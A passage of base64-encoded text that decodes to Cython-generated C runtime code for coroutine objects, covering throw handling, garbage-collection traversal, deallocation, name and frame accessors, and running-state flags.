B7CiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCAqcmV0OwogICAgICAgIFB5X0lOQ1JFRih5Zik7CiAgICAgICAgaWYgKF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyh0eXAsIFB5RXhjX0dlbmVyYXRvckV4aXQpICYmIGNsb3NlX29uX2dlbmV4aXQpIHsKICAgICAgICAgICAgaW50IGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7CiAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7CiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICAgICAgICAgIGlmIChlcnIgPCAwKQogICAgICAgICAgICAgICAgZ290byBwcm9wYWdhdGVfZXhjZXB0aW9uOwogICAgICAgICAgICBnb3RvIHRocm93X2hlcmU7CiAgICAgICAgfQogICAgICAgIGlmICgwCiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICAgICAgICAgIHx8IF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgICAgICB8fCBfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpCiAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHlmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpOwogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lQXdhaXRfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfX0Nvcm91dGluZV9UaHJvdygoKF9fcHl4X0Nvcm91dGluZUF3YWl0T2JqZWN0Kil5ZiktPmNvcm91dGluZSwgdHlwLCB2YWwsIHRiLCBhcmdzLCBjbG9zZV9vbl9nZW5leGl0KTsKICAgICAgICAjZW5kaWYKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyb3cpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIW1ldGgpKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoeWYpOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICAgICAgICAgICAgICBnb3RvIHRocm93X2hlcmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGxpa2VseShhcmdzKSkgewogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChtZXRoLCBhcmdzLCBOVUxMKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjYXJnc1s0XSA9IHtOVUxMLCB0eXAsIHZhbCwgdGJ9OwogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwobWV0aCwgY2FyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoeWYpOwogICAgICAgIGlmIChyZXQpIHsKICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCAmcmV0KTsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldCwgMCk7CiAgICB9CnRocm93X2hlcmU6CiAgICBfX1B5eF9SYWlzZSh0eXAsIHZhbCwgdGIsIE5VTEwpOwpwcm9wYWdhdGVfZXhjZXB0aW9uOgogICAgewogICAgICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgTlVMTCwgJnJldHZhbCwgMCk7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDApOwogICAgfQp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJncykgewogICAgUHlPYmplY3QgKnR5cDsKICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMOwogICAgUHlPYmplY3QgKnRiID0gTlVMTDsKICAgIGlmICh1bmxpa2VseSghUHlBcmdfVW5wYWNrVHVwbGUoYXJncywgInRocm93IiwgMSwgMywgJnR5cCwgJnZhbCwgJnRiKSkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gX19QeXhfX0Nvcm91dGluZV9UaHJvdyhzZWxmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIDEpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgUHlfVklTSVQoZXhjX3N0YXRlLT5leGNfdmFsdWUpOwojZWxzZQogICAgUHlfVklTSVQoZXhjX3N0YXRlLT5leGNfdHlwZSk7CiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spOwojZW5kaWYKICAgIHJldHVybiAwOwp9CnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewogICAgewogICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopZ2VuLCAxLCB2aXNpdCwgYXJnKTsKICAgICAgICBpZiAoZSkgcmV0dXJuIGU7CiAgICB9CiAgICBQeV9WSVNJVChnZW4tPmNsb3N1cmUpOwogICAgUHlfVklTSVQoZ2VuLT5jbGFzc29iaik7CiAgICBQeV9WSVNJVChnZW4tPnlpZWxkZnJvbSk7CiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlX2V4Y3N0YXRlKCZnZW4tPmdpX2V4Y19zdGF0ZSwgdmlzaXQsIGFyZyk7Cn0Kc3RhdGljIGludCBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoUHlPYmplY3QgKnNlbGYpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgUHlfQ0xFQVIoZ2VuLT5jbG9zdXJlKTsKICAgIFB5X0NMRUFSKGdlbi0+Y2xhc3NvYmopOwogICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcigmZ2VuLT5naV9leGNfc3RhdGUpOwojaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHsKICAgICAgICBQeV9DTEVBUigoKF9fcHl4X1B5QXN5bmNHZW5PYmplY3QqKWdlbiktPmFnX2ZpbmFsaXplcik7CiAgICB9CiNlbmRpZgogICAgUHlfQ0xFQVIoZ2VuLT5naV9jb2RlKTsKICAgIFB5X0NMRUFSKGdlbi0+Z2lfZnJhbWUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9uYW1lKTsKICAgIFB5X0NMRUFSKGdlbi0+Z2lfcXVhbG5hbWUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9tb2R1bGVuYW1lKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9kZWFsbG9jKFB5T2JqZWN0ICpzZWxmKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soZ2VuKTsKICAgIGlmIChnZW4tPmdpX3dlYWtyZWZsaXN0ICE9IE5VTEwpCiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcyhzZWxmKTsKICAgIGlmIChnZW4tPnJlc3VtZV9sYWJlbCA+PSAwKSB7CiAgICAgICAgUHlPYmplY3RfR0NfVHJhY2soc2VsZik7CiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhzZWxmKSkpCiNlbHNlCiAgICAgICAgewogICAgICAgICAgICBkZXN0cnVjdG9yIGRlbCA9IF9fUHl4X1B5T2JqZWN0X0dldFNsb3QoZ2VuLCB0cF9kZWwsIGRlc3RydWN0b3IpOwogICAgICAgICAgICBpZiAoZGVsKSBkZWwoc2VsZik7CiAgICAgICAgfQogICAgICAgIGlmICh1bmxpa2VseShQeV9SRUZDTlQoc2VsZikgPiAwKSkKI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7CiAgICB9CiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgIAogICAgICAgIFB5X0NMRUFSKCgoX19weXhfUHlBc3luY0dlbk9iamVjdCopc2VsZiktPmFnX2ZpbmFsaXplcik7CiAgICB9CiNlbmRpZgogICAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKHNlbGYpOwogICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwoZ2VuKTsKfQojaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQpzdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfZGVsKFB5T2JqZWN0ICpzZWxmKSB7CiAgICBQeU9iamVjdCAqZXJyb3JfdHlwZSwgKmVycm9yX3ZhbHVlLCAqZXJyb3JfdHJhY2ViYWNrOwogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIGlmIChnZW4tPnJlc3VtZV9sYWJlbCA8IDApIHsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXJyRmV0Y2goJmVycm9yX3R5cGUsICZlcnJvcl92YWx1ZSwgJmVycm9yX3RyYWNlYmFjayk7CiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgIF9fcHl4X1B5QXN5bmNHZW5PYmplY3QgKmFnZW4gPSAoX19weXhfUHlBc3luY0dlbk9iamVjdCopc2VsZjsKICAgICAgICBQeU9iamVjdCAqZmluYWxpemVyID0gYWdlbi0+YWdfZmluYWxpemVyOwogICAgICAgIGlmIChmaW5hbGl6ZXIgJiYgIWFnZW4tPmFnX2Nsb3NlZCkgewogICAgICAgICAgICBQeU9iamVjdCAqcmVzID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhmaW5hbGl6ZXIsIHNlbGYpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXJlcykpIHsKICAgICAgICAgICAgICAgIFB5RXJyX1dyaXRlVW5yYWlzYWJsZShzZWxmKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICB9CiNlbmRpZgogICAgaWYgKHVubGlrZWx5KGdlbi0+cmVzdW1lX2xhYmVsID09IDAgJiYgIWVycm9yX3ZhbHVlKSkgewojaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICBpZiAoIV9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHNlbGYpKQojZW5kaWYKICAgICAgICB7CiAgICAgICAgUHlPYmplY3RfR0NfVW5UcmFjayhzZWxmKTsKICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfV2FybkZvcm1hdChQeUV4Y19SdW50aW1lV2FybmluZywgMSwgImNvcm91dGluZSAnJS41MFMnIHdhcyBuZXZlciBhd2FpdGVkIiwgZ2VuLT5naV9xdWFsbmFtZSkgPCAwKSkKICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpOwogICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKHNlbGYpOwogICAgICAgIH0KI2VuZGlmCiAgICB9IGVsc2UgewogICAgICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2Uoc2VsZiwgJnJldHZhbCk7CiAgICAgICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikgewogICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfWERFQ1JFRihyZXR2YWwpOwogICAgICAgIH0KICAgIH0KICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7Cn0KI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0Nvcm91dGluZV9nZXRfbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfbmFtZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KCFuYW1lKSkgbmFtZSA9IFB5X05vbmU7CiAgICBQeV9JTkNSRUYobmFtZSk7CiAgICByZXR1cm4gbmFtZTsKfQpzdGF0aWMgaW50Cl9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX25hbWUsIHZhbHVlKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0Nvcm91dGluZV9nZXRfcXVhbG5hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCB2b2lkICpjb250ZXh0KQp7CiAgICBQeU9iamVjdCAqbmFtZSA9IHNlbGYtPmdpX3F1YWxuYW1lOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTsKICAgIFB5X0lOQ1JFRihuYW1lKTsKICAgIHJldHVybiBuYW1lOwp9CnN0YXRpYyBpbnQKX19QeXhfQ29yb3V0aW5lX3NldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiX19xdWFsbmFtZV9fIG11c3QgYmUgc2V0IHRvIGEgc3RyaW5nIG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChzZWxmLT5naV9xdWFsbmFtZSwgdmFsdWUpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmKQp7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKmZyYW1lOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oc2VsZik7CiAgICAjZW5kaWYKICAgIGZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7CiAgICBpZiAoIWZyYW1lKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmLT5naV9jb2RlKSkgewogICAgICAgICAgICBQeV9SRVRVUk5fTk9ORTsKICAgICAgICB9CiAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFnbG9iYWxzKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgZnJhbWUgPSAoUHlPYmplY3QgKikgUHlGcmFtZV9OZXcoCiAgICAgICAgICAgIFB5VGhyZWFkU3RhdGVfR2V0KCksICAgICAgICAgICAgCiAgICAgICAgICAgIChQeUNvZGVPYmplY3QqKSBzZWxmLT5naV9jb2RlLCAgCiAgICAgICAgICAgIGdsb2JhbHMsICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgKTsKICAgICAgICBQeV9ERUNSRUYoZ2xvYmFscyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFmcmFtZSkpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIGlmICh1bmxpa2VseShzZWxmLT5naV9mcmFtZSkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKGZyYW1lKTsKICAgICAgICAgICAgZnJhbWUgPSBzZWxmLT5naV9mcmFtZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBzZWxmLT5naV9mcmFtZSA9IGZyYW1lOwogICAgICAgIH0KICAgIH0KICAgIFB5X0lOQ1JFRihmcmFtZSk7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgICNlbmRpZgogICAgcmV0dXJuIGZyYW1lOwojZWxzZQogICAgQ1lUSE9OX1VOVVNFRF9WQVIoc2VsZik7CiAgICBQeV9SRVRVUk5fTk9ORTsKI2VuZGlmCn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ29yb3V0aW5lX2dldF9mcmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKmZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7CiAgICBpZiAoZnJhbWUpCiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmcmFtZSk7CiAgICByZXR1cm4gX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoc2VsZik7Cn0Kc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoCiAgICAgICAgICAgIFB5VHlwZU9iamVjdCogdHlwZSwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSkgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBQeU9iamVjdF9HQ19OZXcoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB0eXBlKTsKICAgIGlmICh1bmxpa2VseSghZ2VuKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoZ2VuLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpOwp9CnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdCgKICAgICAgICAgICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpIHsKICAgIGdlbi0+Ym9keSA9IGJvZHk7CiAgICBnZW4tPmNsb3N1cmUgPSBjbG9zdXJlOwogICAgUHlfWElOQ1JFRihjbG9zdXJlKTsKICAgIGdlbi0+aXNfcnVubmluZyA9IDA7CiAgICBnZW4tPnJlc3VtZV9sYWJlbCA9IDA7CiAgICBnZW4tPmNsYXNzb2JqID0gTlVMTDsKICAgIGdlbi0+eWllbGRmcm9tID0gTlVMTDsKICAgIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQgPSBOVUxMOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSA9IE5VTEw7CiAgICAjZWxzZQogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3R5cGUgPSBOVUxMOwogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDsKICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMOwogICAgI2VuZGlmCiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5wcmV2aW91c19pdGVtID0gTlVMTDsKI2VuZGlmCiAgICBnZW4tPmdpX3dlYWtyZWZsaXN0ID0gTlVMTDsKICAgIFB5X1hJTkNSRUYocXVhbG5hbWUpOwogICAgZ2VuLT5naV9xdWFsbmFtZSA9IHF1YWxuYW1lOwogICAgUHlfWElOQ1JFRihuYW1lKTsKICAgIGdlbi0+Z2lfbmFtZSA9IG5hbWU7CiAgICBQeV9YSU5DUkVGKG1vZHVsZV9uYW1lKTsKICAgIGdlbi0+Z2lfbW9kdWxlbmFtZSA9IG1vZHVsZV9uYW1lOwogICAgUHlfWElOQ1JFRihjb2RlKTsKICAgIGdlbi0+Z2lfY29kZSA9IGNvZGU7CiAgICBnZW4tPmdpX2ZyYW1lID0gTlVMTDsKICAgIFB5T2JqZWN0X0dDX1RyYWNrKGdlbik7CiAgICByZXR1cm4gZ2VuOwp9CnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikgewogICAgY2hhciByZXN1bHQ7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pOwogICAgI2VuZGlmCiAgICByZXN1bHQgPSBnZW4tPmlzX3J1bm5pbmc7CiAgICBnZW4tPmlzX3J1bm5pbmcgPSAxOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7CiAgICAjZW5kaWYKICAgIGFzc2VydChnZW4tPmlzX3J1bm5pbmcpOwogICAgZ2VuLT5pc19ydW5uaW5nID0gMDsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgI2VuZGlmCn0Kc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7CiAgICBjaGFyIHJlc3VsdDsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7CiAgICAjZW5kaWYKICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZzsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlcihQeU9iamVjdCAqZ2VuLCB2b2lkICpjbG9zdXJlKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjbG9zdXJlKTsKICAgIGNoYXIgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKWdlbik7C